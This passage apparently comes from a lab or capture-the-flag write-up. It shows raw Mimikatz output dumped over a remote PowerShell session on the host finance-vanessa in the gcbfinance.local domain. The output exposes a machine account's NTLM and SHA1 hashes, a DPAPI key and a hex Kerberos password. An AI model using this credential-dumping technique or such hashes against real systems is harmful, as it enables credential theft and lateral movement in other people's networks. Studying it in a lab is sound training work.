        msv :
         [00000003] Primary
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * NTLM     : 6916055ee8cb4cfc879e110d51a29fb2
         * SHA1     : bea90fe72c67f07bfd66535c902aa1d266ca47f5
         * DPAPI    : bea90fe72c67f07bfd66535c902aa1d2
        tspkg :
        wdigest :
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * Password : (null)
        kerberos :
         * Username : FINANCE-VANESSA$
         * Domain   : gcbfinance.local
         * Password : a5 95 11 90 2d dc 62 8d dd 0c d7 ae 40 13 c2 b5 37 94 43 43 13 b9 18 07 c0 50 e2 3e fe 29 36 8a 17 c6 36 94 7a 3d 12 a6 d8 ee 07 54 38 9e d9 10 75 a4 93 30 d8 6a 3e 4a b0 54 33 d1 f0 6c 7e d0 c0 33 51 94 ab b0 be 97 44 11 8e c6 fb ba 1d 48 91 3e d0 b8 d3 b2 d2 a8 d7 13 9a 69 86 64 79 8a 52 5b 77 51 b2 d1 d7 fe 72 d3 3d cf db f5 c9 fa a2 1a f4 ff de 14 7b 29 c9 ca 2b 1b 8b 73 e7 f6 67 d7 76 ad f0 d0 38 f5 4e ae fb c4 00 b3 78 21 a8 74 7f e4 b1 6d 54 eb 6d c2 2f 55 9b 23 25 df a3 9c 65 0d 96 4f 3f e7 4b f4 11 26 37 58 f8 1d 53 69 29 fc 70 aa f6 48 ee 35 f9 4d b0 da 6a 1a da 7e e1 f9 13 3b b8 7a 35 92 03 eb fe da a9 db 9a ab 32 6b 39 b2 3a e5 83 79 1a 7b ae 24 f6 56 f5 9e 47 46 ad 3d 54 a4 2f 9f a4 93 99 c1 96 39
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : FINANCE-VANESSA$
Domain            : FINANCE
Logon Server      : (null)
Logon Time        : 4/28/2024 11:44:56 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : FINANCE-VANESSA$
         * Domain   : FINANCE
         * Password : (null)
        kerberos :
         * Username : finance-vanessa$
         * Domain   : GCBFINANCE.LOCAL
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # exit
Bye!
[finance-vanessa.gcbfinance.local]: PS C:\>

```

[back](./section3.html)
